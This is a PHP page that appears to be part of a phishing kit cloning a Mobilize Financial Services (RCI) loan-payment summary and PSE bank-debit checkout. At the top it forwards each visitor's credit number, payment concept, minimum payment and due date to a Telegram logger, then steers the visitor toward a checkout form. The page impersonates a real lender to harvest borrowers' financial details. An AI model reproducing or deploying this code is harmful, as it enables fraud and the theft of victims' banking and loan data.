<?php
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';

if (empty($_SESSION['userInfo']) || empty($_SESSION['creditNumber'])) {
    header('Location: index.html');
    exit;
}

$creditNumber = $_SESSION['creditNumber'];
$payment      = $_SESSION['payment'] ?? [];

$concept    = $payment['concept'] ?? 'Pago credito RCI';
$minPayment = $payment['minPayment'] ?? null;
$dueDate    = $payment['dueDate'] ?? null;
$valueToPay = $payment['valueToPay'] ?? $minPayment;

function formatMoney($value): string {
    if ($value === null || $value === '') {
        return 'No disponible';
    }
    return number_format((float) $value, 2);
}

function formatDate($value): string {
    if (!$value) {
        return 'No disponible';
    }
    $ts = strtotime((string) $value);
    return $ts ? date('d/m/Y', $ts) : htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

telegram_log('📄 Vista de resumen de pago', [
    'Crédito'     => $creditNumber,
    'Concepto'    => $concept,
    'Pago mínimo' => formatMoney($minPayment),
    'Vencimiento' => formatDate($dueDate),
]);
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Resumen de tu transacción - Mobilize Financial Services</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/styles.css">
</head>
<body>

<div class="page-column">

<header>
  <img class="site-logo" src="assets/images/download.svg" alt="Mobilize Financial Services">
</header>

<div class="payment-zone-wrapper">
  <div class="payment-zone">
    <div class="card">
      <main class="payment-summary">
        <h3 class="summary-title">Resumen de tu transacción</h3>

        <div class="field readonly-field">
          <label for="creditNumberReadonly">Número de crédito <span class="required">*</span></label>
          <input type="text" id="creditNumberReadonly" value="<?php echo htmlspecialchars($creditNumber, ENT_QUOTES, 'UTF-8'); ?>" readonly>
        </div>

        <form method="POST" action="checkout.php">
          <div class="table-wrapper">
            <table class="payment-table">
              <thead>
                <tr>
                  <th>Concepto</th>
                  <th>Pago mínimo</th>
                  <th>Fecha próximo vencimiento</th>
                  <th>Valor a pagar</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td data-label="Concepto"><?php echo htmlspecialchars((string) $concept, ENT_QUOTES, 'UTF-8'); ?></td>
                  <td data-label="Pago mínimo">$<?php echo formatMoney($minPayment); ?></td>
                  <td data-label="Fecha próximo vencimiento"><?php echo formatDate($dueDate); ?></td>
                  <td data-label="Valor a pagar">
                    <div class="amount-input">
                      <span>$</span>
                      <input type="text" id="valueToPay" name="valueToPay" inputmode="decimal" value="<?php echo formatMoney($valueToPay); ?>">
                      <img class="input-indicator" src="assets/images/download-1.svg" alt="">
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>

          <div class="total-row">
            <span class="total-label">Total:</span>
            <div class="total-chip">
              <span class="chip-dollar">$</span>
              <span id="totalValue"><?php echo formatMoney($valueToPay); ?></span>
            </div>
          </div>

          <label class="checkbox-row">
            <input type="checkbox" checked>
            <span>Pago PSE - débito desde tu cuenta de ahorros o corriente</span>
            <img class="pse-badge" src="assets/images/download-1.png" alt="PSE">
          </label>

          <div class="actions actions-end">
            <a href="index.html" class="btn-back">Regresar</a>
            <button type="submit" class="btn-continue active" id="pay-button">Continuar</button>
          </div>
        </form>
      </main>
    </div>
  </div>
</div>

<footer>
  <img src="./assets/images/prueba-4.png" alt="Imagen ilustrativa" class="mobile-hidden" onerror="this.style.display='none'">
</footer>

</div>

<script>
  const valueToPayInput = document.getElementById('valueToPay');
  const totalValue = document.getElementById('totalValue');

  function parseAmount(str) {
    const cleaned = str.replace(/[^0-9.,]/g, '').replace(/,/g, '');
    const num = parseFloat(cleaned);
    return isNaN(num) ? 0 : num;
  }

  function formatAmount(num) {
    return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  valueToPayInput.addEventListener('input', () => {
    totalValue.textContent = formatAmount(parseAmount(valueToPayInput.value));
  });

  valueToPayInput.addEventListener('blur', () => {
    valueToPayInput.value = formatAmount(parseAmount(valueToPayInput.value));
  });
</script>

</body>
</html>
